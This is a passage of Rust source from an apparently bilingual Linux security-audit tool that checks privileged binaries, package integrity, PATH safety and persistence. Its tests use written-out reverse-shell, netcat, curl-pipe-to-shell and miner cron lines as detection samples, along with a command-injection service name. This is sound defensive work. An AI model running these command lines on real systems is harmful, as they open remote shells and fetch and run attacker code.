    let chemins_modifies: Vec<std::path::PathBuf> = modifies.iter().map(|(p, _)| p.clone()).collect();
    let gestes_modifies = gestes_de_privilegies(&chemins_modifies, caps, mode);
    let gestes_anormaux = gestes_de_privilegies(&anormaux, caps, mode);
    let modifies: Vec<(String, String)> = modifies
        .into_iter()
        .map(|(p, paquet)| (crate::ui::chemin_affichable(&p), paquet))
        .collect();
    let reinstaller = {
        let mut paquets: Vec<&str> = modifies.iter().map(|(_, p)| p.as_str()).collect();
        paquets.dedup();
        gestion.map(|g| g.reinstaller(&paquets.join(" "))).unwrap_or_default()
    };
    let path = std::env::var("PATH").unwrap_or_default();
    let path_dangereux = path_dangereux(&path, |d| std::fs::metadata(d).ok().map(|m| m.permissions().mode()));
    juger_fichiers_suspects(&Releve {
        modifies,
        anormaux,
        systeme: systeme.len(),
        gestion: gestion.is_some(),
        non_verifies,
        capacites_lues: capacites.is_some(),
        path_dangereux,
        reinstaller,
        gestes_modifies,
        gestes_anormaux,
    })
}

/// Les gestes qui retirent leurs droits à ces programmes : le setuid/setgid de ceux qui l'ont (`mode`, lu sans
/// suivre de lien), les capacités de ceux que getcap a listés (`capacites`, chemins réels). Tous ou aucun : un chemin
/// qu'un geste ne porte pas, un programme qui n'a plus rien de privilégié (changé depuis le parcours), ou plus de
/// `defense::GESTES_MAX` gestes, et la liste reste à la main. L'enfant root rejuge chacun (paquet, chemin, sudo, su
/// et pkexec) avant de rien faire.
fn gestes_de_privilegies(
    chemins: &[std::path::PathBuf],
    capacites: &[std::path::PathBuf],
    mode: impl Fn(&Path) -> Option<u32>,
) -> Vec<Defense> {
    use std::os::unix::ffi::OsStrExt;
    let mut gestes = Vec::new();
    for p in chemins {
        let Some(c) = gestes_unix::CheminDesigne::nouveau(p.as_os_str().as_bytes()) else {
            return Vec::new();
        };
        let setuid = mode(p).is_some_and(|m| m & 0o6000 != 0);
        let reel = std::fs::canonicalize(p).unwrap_or_else(|_| p.clone());
        let caps = capacites.iter().any(|k| k == p || *k == reel);
        if !setuid && !caps {
            return Vec::new();
        }
        if setuid {
            gestes.push(Defense::RetirerSetuid(c));
        }
        if caps {
            gestes.push(Defense::RetirerCapacites(c));
        }
    }
    if gestes.len() > crate::machine::defense::GESTES_MAX {
        return Vec::new();
    }
    gestes
}

/// Les programmes privilégiés relevés : ceux des dossiers temporaires et personnels qui donnent des droits (setuid à un
/// autre compte, setgid du groupe root), ceux des dossiers du système (chemin réel, sans doublon), et ceux à capacités
/// (tels que getcap les nomme, puis par leur chemin réel ; `None` : getcap n'a pas répondu).
#[allow(
    clippy::type_complexity,
    reason = "trois listes rendues d'un seul parcours, nommées par la doc"
)]
fn programmes_privilegies() -> (
    Vec<std::path::PathBuf>,
    Vec<std::path::PathBuf>,
    Option<Vec<std::path::PathBuf>>,
) {
    use std::os::unix::fs::{MetadataExt, PermissionsExt};
    // Propriétaire du processus, lu sur /proc/self (sans dépendance à la libc).
    let moi = std::fs::metadata("/proc/self").map_or(u32::MAX, |m| m.uid());
    // Dans un dossier temporaire ou personnel, un setuid à soi ne donne aucun droit de plus ; un setuid à un autre
    // compte (root) ou un setgid du groupe root, si.
    let dangereux_hors_systeme = |p: &Path| {
        p.symlink_metadata().is_ok_and(|m| {
            m.is_file()
                && ((m.permissions().mode() & 0o4000 != 0 && m.uid() != moi)
                    || (m.permissions().mode() & 0o2000 != 0 && m.gid() == 0))
        })
    };
    let privilegie = |p: &Path| {
        p.symlink_metadata()
            .is_ok_and(|m| m.is_file() && m.permissions().mode() & 0o6000 != 0)
    };
    // Capacités (setcap) : droits root partiels, invisibles dans « ls -l ». Poser une capacité demande root.
    // Lancé tout de suite, en même temps que les parcours : getcap relit tout /usr/lib (0,6 s).
    // Par son chemin : sous Debian, /usr/sbin n'est pas dans le PATH d'un compte ordinaire, et getcap n'y serait
    // jamais trouvé (les capacités jamais lues).
    let capacites = std::thread::spawn(|| {
        let getcap = crate::commande::outil_systeme("getcap")?;
        sortie(
            &getcap.to_string_lossy(),
            &[
                "-r",
                "/usr/bin",
                "/usr/sbin",
                "/usr/local",
                "/usr/lib",
                "/usr/libexec",
                "/opt",
                "/tmp",
                "/var/tmp",
                "/dev/shm",
            ],
        )
        .map(|s| fichiers_capacites(&s))
    });
    let mut anormaux = Vec::new();
    for (d, prof) in [("/tmp", 3), ("/var/tmp", 3), ("/dev/shm", 3), (home().as_str(), 2)] {
        parcourir(Path::new(d), prof, &mut anormaux, &dangereux_hors_systeme);
    }
    // Dans les dossiers système : chaque setuid ou setgid doit venir d'un paquet, et être intact.
    let mut systeme = Vec::new();
    for (d, prof) in [
        ("/usr/bin", 0),
        ("/usr/sbin", 0),
        ("/usr/local/bin", 0),
        ("/usr/local/sbin", 0),
        ("/usr/lib", 2),
        ("/usr/libexec", 2),
        ("/opt", 3),
    ] {
        parcourir(Path::new(d), prof, &mut systeme, &privilegie);
    }
    let capacites = capacites.join().ok().flatten();
    for p in capacites.iter().flatten() {
        if ["/tmp/", "/var/tmp/", "/dev/shm/"].iter().any(|d| p.starts_with(d)) {
            anormaux.push(p.clone());
        } else if !systeme.contains(p) {
            systeme.push(p.clone());
        }
    }
    // /usr/sbin est un lien vers /usr/bin sur Arch : chemin réel (celui que connaît le paquet), sans doublon.
    let mut systeme: Vec<std::path::PathBuf> = systeme
        .into_iter()
        .map(|p| std::fs::canonicalize(&p).unwrap_or(p))
        .collect();
    systeme.sort();
    systeme.dedup();
    let capacites = capacites.map(|v| {
        let mut tous: Vec<std::path::PathBuf> = v.iter().filter_map(|p| std::fs::canonicalize(p).ok()).collect();
        tous.extend(v);
        tous
    });
    (anormaux, systeme, capacites)
}

/// Chaque programme privilégié du système comparé à son paquet : ceux d'aucun paquet rejoignent `anormaux` ; rend les
/// modifiés (chemin, paquet) et le nombre de ceux qui n'ont pas pu être vérifiés.
fn comparer_aux_paquets(
    gestion: Paquets,
    systeme: &[std::path::PathBuf],
    anormaux: &mut Vec<std::path::PathBuf>,
) -> (Vec<(std::path::PathBuf, String)>, usize) {
    let mut par_paquet: std::collections::BTreeMap<String, Vec<std::path::PathBuf>> = std::collections::BTreeMap::new();
    for (p, proprietaire) in systeme.iter().zip(gestion.proprietaires(systeme)) {
        match proprietaire {
            Some(paquet) => par_paquet.entry(paquet).or_default().push(p.clone()),
            None => anormaux.push(p.clone()),
        }
    }
    let (mut modifies, mut non_verifies) = (Vec::new(), 0usize);
    // Chaque paquet se vérifie à part (pacman, zcat et sha256sum, ou dpkg --verify, en lecture seule) : 16 à la
    // fois plutôt qu'un par un, une vingtaine de paquets attendaient l'un après l'autre.
    let paquets: Vec<(&String, &Vec<std::path::PathBuf>)> = par_paquet.iter().collect();
    let mut etats = Vec::new();
    for groupe in paquets.chunks(16) {
        std::thread::scope(|s| {
            let fils: Vec<_> = groupe
                .iter()
                .map(|(paquet, fichiers)| s.spawn(move || gestion.modifies(paquet, fichiers)))
                .collect();
            etats.extend(fils.into_iter().map(|f| f.join().unwrap_or_default()));
        });
    }
    for ((paquet, fichiers), etats) in paquets.into_iter().zip(etats) {
        // Un fil qui a planté rend une liste vide : ses fichiers comptent comme non vérifiés.
        let etats = etats.into_iter().chain(std::iter::repeat(None));
        for (f, etat) in fichiers.iter().zip(etats) {
            match etat {
                Some(true) => modifies.push((f.clone(), paquet.clone())),
                Some(false) => {}
                None => non_verifies = non_verifies.saturating_add(1),
            }
        }
    }
    (modifies, non_verifies)
}

/// Ce que la lecture des programmes privilégiés a relevé, pour son jugement (séparé pour le corpus de détection).
pub(super) struct Releve {
    /// Programmes privilégiés changés depuis leur installation : (chemin montré, paquet).
    pub modifies: Vec<(String, String)>,
    /// Hors paquet, ou dans un dossier temporaire.
    pub anormaux: Vec<std::path::PathBuf>,
    /// Combien de programmes privilégiés dans les dossiers du système.
    pub systeme: usize,
    /// Le gestionnaire de paquets est reconnu.
    pub gestion: bool,
    pub non_verifies: usize,
    /// getcap a répondu.
    pub capacites_lues: bool,
    /// Les dossiers du PATH où d'autres peuvent écrire.
    pub path_dangereux: Vec<String>,
    /// La commande qui remet les paquets des programmes modifiés.
    pub reinstaller: String,
    /// Les gestes de défense qui retirent leurs droits aux modifiés (`gestes_de_privilegies`) ; vide : à la main.
    pub gestes_modifies: Vec<Defense>,
    /// De même pour les anormaux.
    pub gestes_anormaux: Vec<Defense>,
}

pub(super) fn juger_fichiers_suspects(r: &Releve) -> Vec<Constat> {
    let Releve {
        modifies,
        anormaux,
        systeme: n,
        gestion,
        non_verifies,
        capacites_lues,
        path_dangereux: dangereux,
        reinstaller,
        gestes_modifies,
        gestes_anormaux,
    } = r;
    let (n, non_verifies) = (*n, *non_verifies);
    let mut constats = Vec::new();
    if !modifies.is_empty() {
        let liste: Vec<String> = modifies
            .iter()
            .map(|(f, p)| trf!("{f} (paquet {p})", "{f} (package {p})"))
            .collect();
        let constat = alerte(
            "Fichiers suspects",
            Niveau::Critique,
            trf!(
                "Programme(s) privilégié(s) modifié(s) depuis leur installation : {}. Signe possible d'une porte dérobée.", "Privileged program(s) modified since install: {}. Possible sign of a backdoor.",
                liste.join(", ")
            ),
        )
        .manuel(
            tr!("Ne pas le lancer. Remettre l'original depuis les dépôts, puis lancer l'antivirus et changer vos mots de passe", "Do not run it. Restore the original from the repositories, then run the antivirus and change your passwords"),
            &[reinstaller],
        );
        // Retirer ses droits le rend inoffensif tout de suite ; la réinstallation reste à faire (elle les remet,
        // avec le programme d'origine).
        constats.push(crate::machine::defense::corriger(
            constat,
            trf!(
                "Retirer ses droits (setuid, capacités) pour qu'il ne puisse plus servir, puis le remettre depuis les dépôts ({}), lancer l'antivirus et changer vos mots de passe",
                "Remove its rights (setuid, capabilities) so it can no longer be used, then restore it from the repositories ({}), run the antivirus and change your passwords",
                reinstaller
            ),
            gestes_modifies,
        ));
    }
    if !anormaux.is_empty() {
        // Dans un dossier temporaire, n'importe qui choisit le nom : montré (message et commandes à taper), il est
        // rendu inoffensif.
        let liste: Vec<String> = anormaux
            .iter()
            .take(10)
            .map(|p| crate::ui::chemin_affichable(p))
            .collect();
        let constat = alerte(
            "Fichiers suspects",
            Niveau::Eleve,
            trf!(
                "Programme(s) setuid, setgid ou à capacités hors paquet ou dans un dossier temporaire : {}.", "Setuid, setgid or capability program(s) not from a package or in a temporary folder: {}.",
                liste.join(", ")
            ),
        )
        .manuel(
            tr!("Ces programmes peuvent donner des droits root : vérifier d'où ils viennent avant toute chose (ne pas les lancer)", "These programs can give root rights: check where they come from before anything else (do not run them)"),
            &[&format!("ls -l {}", liste.join(" ")), &format!("getcap {}", liste.join(" "))],
        );
        constats.push(crate::machine::defense::corriger(
            constat,
            tr!(
                "Leur retirer ces droits (setuid, setgid, capacités ; le fichier reste, Défaire les remet), puis chercher d'où ils viennent (ne pas les lancer)",
                "Remove those rights from them (setuid, setgid, capabilities; the file stays, Undo puts them back), then find out where they come from (do not run them)"
            ),
            gestes_anormaux,
        ));
    }
    // Un programme privilégié trouvé ne dit rien des capacités : getcap muet, elles n'ont pas été lues, et c'est dit.
    let trouves = !modifies.is_empty() || !anormaux.is_empty();
    if !capacites_lues && trouves {
        constats.push(crate::machine::impossible(
            "Fichiers suspects",
            tr!(
                "capacités des programmes : getcap absent",
                "program capabilities: getcap missing"
            ),
        ));
    }
    if modifies.is_empty() && anormaux.is_empty() {
        let mut message = match (gestion, non_verifies) {
            (false, _) => trf!(
                "Aucun programme privilégié dans les dossiers temporaires ; les {n} du système n'ont pas pu être \
                 rapprochés d'un paquet (gestionnaire de paquets non reconnu).",
                "No privileged program in temporary folders; the {n} system ones could not be \
                 matched to a package (package manager not recognized)."
            ),
            (true, 0) => trf!(
                "Aucun programme privilégié inhabituel : {n} setuid, setgid ou à capacités, tous d'un paquet et intacts.",
                "No unusual privileged program: {n} setuid, setgid or capability programs, all from a package and intact."
            ),
            (true, k) => trf!(
                "Aucun programme privilégié inhabituel : {n} setuid, setgid ou à capacités, tous d'un paquet ; \
                 {k} illisible(s), donc non comparé(s) à l'original.",
                "No unusual privileged program: {n} setuid, setgid or capability programs, all from a package; \
                 {k} unreadable, so not compared to the original."
            ),
        };
        if !capacites_lues {
            message.push_str(tr!(
                " Capacités non vérifiées (getcap absent).",
                " Capabilities not checked (getcap missing)."
            ));
        }
        constats.push(ok("Fichiers suspects", message));
    }
    if !dangereux.is_empty() {
        constats.push(
            alerte(
                "Fichiers suspects",
                Niveau::Eleve,
                trf!(
                    "PATH piégeable : {} (n'importe qui peut y déposer un faux « ls » ou « sudo »).",
                    "Hijackable PATH: {} (anyone can drop a fake “ls” or “sudo” there).",
                    dangereux.join(", ")
                ),
            )
            .manuel(
                tr!(
                    "Retirer ces dossiers du PATH (~/.bashrc, ~/.profile) ou corriger leurs droits",
                    "Remove these folders from the PATH (~/.bashrc, ~/.profile) or fix their permissions"
                ),
                &[],
            ),
        );
    }
    constats
}

#[allow(
    clippy::arithmetic_side_effects,
    clippy::as_conversions,
    reason = "essais : y déborder fait échouer l'essai"
)]
#[cfg(test)]
mod tests {
    use super::*;

    std::thread_local! {
        /// La dernière racine que `persistance_dans` a lue, sur ce fil d'essai.
        pub(super) static RACINE_LUE: std::cell::RefCell<Option<std::path::PathBuf>> =
            const { std::cell::RefCell::new(None) };
    }

    /// D7a : les lignes suspectes des fichiers du système partent par des gestes de défense (une par ligne, sans
    /// doublon) ; une seule ligne ailleurs (dossier personnel, crontab du compte, variable de la session), ou trop de
    /// lignes, et tout reste à la main.
    #[test]
    fn lancements_retires_par_gestes() {
        use crate::machine::gestes_unix::{Defense, GesteUnix, analyser};
        let lancement = |retraits: Vec<Option<(&str, &str)>>| {
            let n = retraits.len();
            constat_des_lancements(Lancements {
                critiques: Vec::new(),
                suspects: (0..n).map(|i| format!("suspect {i}")).collect(),
                sources: Vec::new(),
                retraits: retraits
                    .into_iter()
                    .map(|r| r.map(|(f, l)| (f.into(), l.into())))
                    .collect(),
                ..Lancements::default()
            })
            .correctif
            .unwrap()
        };
        let k = lancement(vec![
            Some(("/etc/ld.so.preload", "/tmp/.x.so /usr/lib/y.so")),
            Some(("/etc/ld.so.preload", "/tmp/.x.so /usr/lib/y.so")),
            Some(("/etc/cron.d/maj", "* * * * * root curl http://exemple.test/x | sh")),
        ]);
        assert!(k.automatique);
        assert_eq!(k.commandes.len(), 2);
        assert!(
            k.commandes
                .iter()
                .all(|l| matches!(analyser(l), Some(GesteUnix::Defense(Defense::RetirerLigne(..), _))))
        );
        assert!(matches!(k.defaire, crate::machine::Defaire::Gestes(ref g) if g.len() == 2));
        // Un mélange : tout à la main.
        assert!(!lancement(vec![Some(("/etc/ld.so.preload", "/tmp/.x.so")), None]).automatique);
        assert!(
            !lancement(vec![
                Some(("/etc/ld.so.preload", "/tmp/.x.so")),
                Some(("/home/alice/.bashrc", "curl x | sh"))
            ])
            .automatique
        );
        // Un fichier au nom piégé n'est jamais désigné.
        assert!(!lancement(vec![Some(("/etc/cron.d/a b", "curl x | sh"))]).automatique);
        // Trop de lignes : à la main.
        let noms: Vec<String> = (0..=crate::machine::defense::GESTES_MAX)
            .map(|i| format!("/etc/cron.d/t{i}"))
            .collect();
        assert!(!lancement(noms.iter().map(|f| Some((f.as_str(), "curl x | sh"))).collect()).automatique);
    }

    /// D7a : chaque service ajouté à la main se désactive par un geste, jamais une unité de session ni du réseau ; un
    /// nom qu'un geste ne porte pas laisse tout à la main, et le nom montré dans la commande est échappé.
    #[test]
    fn services_ajoutes_par_gestes() {
        use crate::machine::gestes_unix::{Defense, GesteUnix, analyser};
        let noms = |v: &[&str]| v.iter().map(|n| (*n).to_string()).collect::<Vec<_>>();
        let k = juger_services_ajoutes(
            &noms(&["maj.timer", "nftables.service", "sauvegarde.service", "sshd.service"]),
            true,
        )
        .unwrap()
        .correctif
        .unwrap();
        assert!(k.automatique);
        let unites: Vec<String> = k
            .commandes
            .iter()
            .map(|l| match analyser(l) {
                Some(GesteUnix::Defense(Defense::DesactiverService(u), _)) => u.as_str().to_string(),
                _ => panic!("geste attendu : {l}"),
            })
            .collect();
        assert_eq!(unites, ["maj.timer", "sauvegarde.service"]);
        assert!(
            !juger_services_ajoutes(&noms(&["a.service"]), false)
                .unwrap()
                .correctif
                .unwrap()
                .automatique
        );
        let k = juger_services_ajoutes(&noms(&["a.service", "x;reboot.service"]), true)
            .unwrap()
            .correctif
            .unwrap();
        assert!(!k.automatique);
        assert!(
            k.commandes.iter().all(|c| c.starts_with("systemctl cat '")),
            "{:?}",
            k.commandes
        );
        assert!(juger_services_ajoutes(&[], true).is_none());
    }

    /// Essai QEMU D7a (Debian) : getcap muet et un setuid hors paquet trouvé, les capacités non lues sont dites à part
    /// (jamais tues derrière l'alerte) ; getcap lu, rien de plus.
    #[test]
    fn capacites_non_lues_dites_meme_avec_une_alerte() {
        let releve = |capacites_lues| Releve {
            modifies: Vec::new(),
            anormaux: vec![std::path::PathBuf::from("/usr/local/bin/alice-x")],
            systeme: 3,
            gestion: true,
            non_verifies: 0,
            capacites_lues,
            path_dangereux: Vec::new(),
            reinstaller: String::new(),
            gestes_modifies: Vec::new(),
            gestes_anormaux: Vec::new(),
        };
        let muet = juger_fichiers_suspects(&releve(false));
        assert!(muet.iter().any(|c| !c.verifie && c.message.contains("getcap")));
        let lu = juger_fichiers_suspects(&releve(true));
        assert!(lu.iter().all(|c| c.verifie));
        assert_eq!(muet.len(), lu.len() + 1);
    }

    /// D7a : un programme privilégié perd son setuid ou ses capacités par un geste ; tous ou aucun : un chemin qu'un
    /// geste ne porte pas, un programme qui n'a plus rien de privilégié ou une liste trop longue laisse tout à la main.
    #[test]
    fn privilegies_par_gestes() {
        use crate::machine::gestes_unix::Defense;
        use std::path::PathBuf;
        const AUCUN: [Defense; 0] = [];
        let p = |s: &str| PathBuf::from(s);
        let modes = |m: u32| move |_: &Path| Some(m);
        let g = gestes_de_privilegies(
            &[p("/tmp/alice-x"), p("/tmp/alice-y")],
            &[p("/tmp/alice-y")],
            |c: &Path| {
                Some(if c == Path::new("/tmp/alice-x") {
                    0o104_755
                } else {
                    0o100_755
                })
            },
        );
        assert!(
            matches!(g.as_slice(), [Defense::RetirerSetuid(a), Defense::RetirerCapacites(b)]
                if a.octets() == b"/tmp/alice-x" && b.octets() == b"/tmp/alice-y"),
            "{g:?}"
        );
        let g = gestes_de_privilegies(&[p("/tmp/alice-x")], &[p("/tmp/alice-x")], modes(0o102_755));
        assert_eq!(g.len(), 2);
        // Plus rien de privilégié (changé depuis le parcours), ou lu par personne : à la main.
        assert_eq!(
            gestes_de_privilegies(&[p("/tmp/alice-x"), p("/tmp/alice-z")], &[], |c: &Path| {
                (c == Path::new("/tmp/alice-x")).then_some(0o104_755)
            }),
            AUCUN
        );
        // Chemin qu'un geste ne porte pas : relatif, à « .. », vide.
        for forge in ["tmp/x", "/tmp/../usr/bin/sudo", "", "/tmp/x/"] {
            assert!(
                gestes_de_privilegies(&[p("/tmp/alice-x"), p(forge)], &[], modes(0o104_755)).is_empty(),
                "{forge}"
            );
        }
        let neuf: Vec<PathBuf> = (0..=crate::machine::defense::GESTES_MAX)
            .map(|i| p(&format!("/tmp/alice{i}")))
            .collect();
        assert_eq!(gestes_de_privilegies(&neuf, &[], modes(0o104_755)), AUCUN);
        assert_eq!(gestes_de_privilegies(&[], &[], modes(0o104_755)), AUCUN);
    }

    /// La ligne retirée est celle du fichier, fin « \r » comprise : l'empreinte que le fils root recalcule.
    #[test]
    fn ligne_telle_qu_ecrite() {
        assert_eq!(telle_qu_ecrite("a\r\nb\n", "a"), "a\r");
        assert_eq!(telle_qu_ecrite("a\nb", "b"), "b");
    }

    /// Le bilan lit la persistance depuis la vraie racine « / » : une autre (relative, ou absolue comme « /x »), le
    /// corpus, qui donne la sienne à `persistance_dans`, ne la verrait pas ; la racine lue est comparée à « / ».
    #[test]
    fn le_bilan_lit_depuis_la_racine() {
        RACINE_LUE.with(|r| *r.borrow_mut() = None);
        let _ = persistance();
        assert_eq!(
            RACINE_LUE.with(|r| r.borrow().clone()),
            Some(std::path::PathBuf::from("/"))
        );
    }

    /// Une seconde ligne suspecte dans un fichier déjà signalé change la clé (avant, seul le fichier y était) ;
    /// l'ordre de lecture et une ligne lue deux fois, non.
    #[test]
    fn nouvelle_ligne_nouvelle_cle() {
        let r1 = "bash -i >& /dev/tcp/10.0.0.9/4444 0>&1";
        let r2 = "curl -s http://exemple.invalid/x | sh";
        let cle = |lignes: &[&str]| {
            let sources = lignes.iter().map(|l| source_de("~/.bashrc", l)).collect();
            crate::modele::Cle::de("LNX-PRS-002", &objet_des_lancements(sources)).unwrap()
        };
        assert_ne!(cle(&[r1]), cle(&[r1, r2]));
        assert_eq!(cle(&[r1, r2]), cle(&[r2, r1, r2]));
        assert_ne!(cle(&[r1]), cle(&[r2]));
        // Les blancs du bord ne changent pas la ligne ; une autre source, si.
        assert_eq!(source_de("crontab", r1), source_de("crontab", &format!("  {r1}\t")));
        assert_ne!(source_de("crontab", r1), source_de("~/.bashrc", r1));
    }

    #[test]
    fn chemins_avant_fusion_de_usr() {
        assert_eq!(
            chemin_hors_usr(Path::new("/usr/bin/fusermount3")).unwrap(),
            Path::new("/bin/fusermount3")
        );
        assert_eq!(chemin_hors_usr(Path::new("/usr/sbin/x")).unwrap(), Path::new("/sbin/x"));
        assert!(chemin_hors_usr(Path::new("/usr/local/bin/x")).is_none());
        assert!(chemin_hors_usr(Path::new("/opt/x")).is_none());
    }

    #[test]
    fn path_piegeable() {
        let droits = |d: &str| match d {
            "/tmp" => Some(0o41777),         // modifiable par tous mais « sticky » : sûr
            "/srv/partage" => Some(0o40777), // modifiable par tous, sans sticky : piège
            _ => Some(0o40755),
        };
        assert_eq!(
            path_dangereux("/usr/bin:/tmp:/srv/partage:.::/bin", droits),
            vec!["/srv/partage", ".", "(vide = dossier courant)"]
        );
        assert_eq!(
            path_dangereux("/usr/local/bin:/usr/bin", droits),
            [] as [std::string::String; 0]
        );
    }

    #[test]
    fn programmes_privilegies() {
        assert_eq!(
            fichiers_capacites(
                "/usr/bin/newuidmap cap_setuid=ep\n/usr/bin/ping = cap_net_raw+ep\n/tmp/un dossier/x cap_sys_admin=ep\n"
            ),
            ["/usr/bin/newuidmap", "/usr/bin/ping", "/tmp/un dossier/x"].map(std::path::PathBuf::from)
        );
        assert_eq!(
            paquet_dpkg("libc6:amd64, libc6-dbg: /usr/bin/ldd\n").as_deref(),
            Some("libc6:amd64")
        );
        assert_eq!(
            paquet_dpkg("diversion by dash from: /bin/sh\ndash: /bin/sh\n").as_deref(),
            Some("dash")
        );
        let mtree = "#mtree\n./usr/bin/sudoedit time=1.0 type=link link=sudo\n./usr/bin/sudo time=1.0 mode=4755 sha256digest=e9f8\n";
        assert_eq!(
            empreinte_mtree(mtree, Path::new("/usr/bin/sudo")).as_deref(),
            Some("e9f8")
        );
        assert_eq!(empreinte_mtree(mtree, Path::new("/usr/bin/sudoedit")), None);
        // Seul « 5 » (contenu) compte : une date ou des droits changés ne prouvent pas un remplacement.
        let verif = "??5??????   /usr/bin/passwd\n.M.......   /usr/bin/su\nS.5....T.  c /etc/sudoers\n";
        assert!(contenu_modifie(verif, Path::new("/usr/bin/passwd")));
        assert!(!contenu_modifie(verif, Path::new("/usr/bin/su")));
        assert!(!contenu_modifie(verif, Path::new("/usr/bin/mount")));
    }

    #[test]
    fn lancements_suspects() {
        // Formes de porte dérobée reconnues partout.
        assert!(commande_suspecte("bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'", false).is_some());
        assert!(commande_suspecte("nc -e /bin/sh 1.2.3.4 4444", false).is_some());
        // nc caché dans une sous-commande, après un « ; » ou derrière un chemin.
        for ligne in [
            "@reboot (nc -e /bin/sh 192.0.2.7 4444 &)",
            "* * * * * cd /tmp;nc -e /bin/sh 192.0.2.7 4444",
            "* * * * * true&&ncat -c bash 192.0.2.7 4444",
            "@reboot { /usr/bin/nc -e /bin/sh 192.0.2.7 4444; }",
            "sh -c '`netcat -e /bin/sh 192.0.2.7 4444`'",
        ] {
            assert!(commande_suspecte(ligne, false).is_some(), "{ligne}");
        }
        assert!(commande_suspecte("curl -fsSL https://x.example/a | sh", false).is_some());
        assert!(commande_suspecte("wget -qO- http://x | /bin/bash", false).is_some());
        assert!(commande_suspecte("echo aGk= | base64 -d | sh", false).is_some());
        // La ligne de cron des mineurs (TeamTNT, Kinsing), telle qu'ils la posent : le téléchargeur entre parenthèses,
        // curl ou à défaut wget, passé à sh.
        for cron in [
            "*/30 * * * * root (curl -fsSL http://192.0.2.7/a.sh||wget -q -O- http://192.0.2.7/a.sh)|sh",
            "*/30 * * * * (curl -fsSL http://192.0.2.7/a.sh||wget -q -O- http://192.0.2.7/a.sh)|sh",
            "* * * * * (curl -fsSL http://192.0.2.7/a.sh)|bash",
            "@reboot $(curl -fsSL http://192.0.2.7/a.sh)|sh",
            "* * * * * cd /tmp;wget -q -O- http://192.0.2.7/a.sh|sudo -u root sh",
        ] {
            assert_eq!(
                commande_suspecte(cron, false),
                Some(tr!(
                    "télécharge un script et l'exécute aussitôt",
                    "downloads a script and runs it right away"
                )),
                "{cron}"
            );
        }
        // Pas des portes dérobées : curl sans exécution, nc sans shell, grep après curl.
        assert!(commande_suspecte("curl -fsS https://x/a.json | jq .", false).is_none());
        assert!(commande_suspecte("nc -z 10.0.0.1 22", false).is_none());
        assert!(commande_suspecte("(nc -z 10.0.0.1 22 && echo ok)", false).is_none());
        assert!(commande_suspecte("export TMPDIR=/tmp/moi", false).is_none());
        // Programme lancé depuis /tmp ou un dossier caché : seulement pour une commande lancée.
        assert!(commande_suspecte("/tmp/.x/run --daemon", true).is_some());
        assert!(commande_suspecte("-/dev/shm/a", true).is_some());
        assert!(commande_suspecte("~/.cache/.u/agent", true).is_some());
        assert!(commande_suspecte("%h/.mozilla/x", true).is_some());
        assert!(commande_suspecte("~/.local/bin/plein-ecran", true).is_none());
        assert!(commande_suspecte("%h/.cargo/bin/vanguard surveiller", true).is_none());
        assert!(commande_suspecte("/usr/bin/xrandr --output DP-1", true).is_none());
        assert!(commande_suspecte("cd /tmp/x", false).is_none());
    }

    /// Le fichier qui lance un programme, tel qu'il est montré : court sous le dossier personnel, et inoffensif.
    #[test]
    fn fichiers_de_demarrage_montres() {
        let maison = Path::new("/home/alice");
        assert_eq!(
            court(Path::new("/home/alice/.config/autostart/x.desktop"), maison),
            "~/.config/autostart/x.desktop"
        );
        assert_eq!(court(Path::new("/etc/profile.d/a.sh"), maison), "/etc/profile.d/a.sh");
        assert_eq!(
            court(
                Path::new("/home/alice/.config/autostart/x\x1b]0;t\x07\x1b[2K\r\u{202e}.desktop"),
                maison
            ),
            "~/.config/autostart/x�]0;t��[2K��.desktop"
        );
    }

    #[test]
    fn lignes_de_demarrage() {
        assert_eq!(
            commande_lancee("ExecStart=-/usr/bin/foo -x").as_deref(),
            Some("-/usr/bin/foo -x")
        );
        assert_eq!(
            commande_lancee("Exec=steam -silent %U").as_deref(),
            Some("steam -silent %U")
        );
        assert_eq!(commande_lancee("exec-once = waybar").as_deref(), Some("waybar"));
        assert_eq!(
            commande_lancee(r#"o.exec_on_start("~/.local/bin/plein-ecran")"#).as_deref(),
            Some("~/.local/bin/plein-ecran")
        );
        assert_eq!(commande_lancee(r#"-- o.launch_on_start("my-service")"#), None);
        assert_eq!(commande_lancee("# ExecStart=/tmp/x"), None);
        assert_eq!(commande_lancee("Description=Exec=/tmp/x"), None);
        assert_eq!(commande_lancee("Name=Steam"), None);
        assert!(definit_prechargement("export LD_PRELOAD=/home/x/.l/libz.so"));
        assert!(definit_prechargement("env = LD_PRELOAD,/tmp/a.so"));
        assert!(!definit_prechargement("unset LD_PRELOAD"));
        assert!(!definit_prechargement("# LD_PRELOAD=/x"));
    }

    /// Une arborescence jetable (racine, dossier personnel d'alice), et la lecture de sa persistance : le constat des
    /// lancements.
    struct Maison {
        racine: std::path::PathBuf,
    }

    impl Maison {
        fn nouvelle(nom: &str) -> Maison {
            let racine = crate::essais::temporaire().join(format!("vanguard-normal-{nom}-{}", std::process::id()));
            let _ = std::fs::remove_dir_all(&racine);
            std::fs::create_dir_all(racine.join("home/alice/.config/systemd/user")).unwrap();
            Maison { racine }
        }

        fn chemin(&self, relatif: &str) -> std::path::PathBuf {
            self.racine.join("home/alice").join(relatif)
        }

        fn ecrire(&self, relatif: &str, texte: &str) {
            let p = self.chemin(relatif);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            let _ = std::fs::remove_file(&p);
            std::fs::write(p, texte).unwrap();
        }

        fn lancements(&self) -> Constat {
            persistance_dans(&self.racine, &self.racine.join("home/alice"), |_| None, None, None)
                .into_iter()
                .next()
                .unwrap()
        }
    }

    impl Drop for Maison {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.racine);
        }
    }

    const UNITE: &str = "[Unit]\nDescription=Rappel\n\n[Service]\nType=oneshot\nExecStart=%h/.cache-x/rappel.sh\n";

    fn maison_avec_rappel(nom: &str) -> Maison {
        let m = Maison::nouvelle(nom);
        m.ecrire(".config/systemd/user/rappel.service", UNITE);
        m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\necho rappel\n");
        m
    }

    /// Le cas qui a mené à ce lot (valeurs inventées) : une unité de l'utilisateur lance un programme d'un dossier
    /// caché, à corriger soi-même. Elle se déclare normale, montre sa ligne, son fichier et le programme lancé ; le
    /// même état relu au bilan suivant est tu.
    #[test]
    fn unite_de_l_utilisateur_declarable() {
        use crate::machine::temoins::Temoins;
        let m = maison_avec_rappel("declarable");
        let c = m.lancements();
        assert_eq!(c.probleme, Some(Niveau::Eleve));
        let k = c.correctif.as_ref().unwrap();
        assert!(!k.automatique, "une ligne du dossier personnel reste à la main");
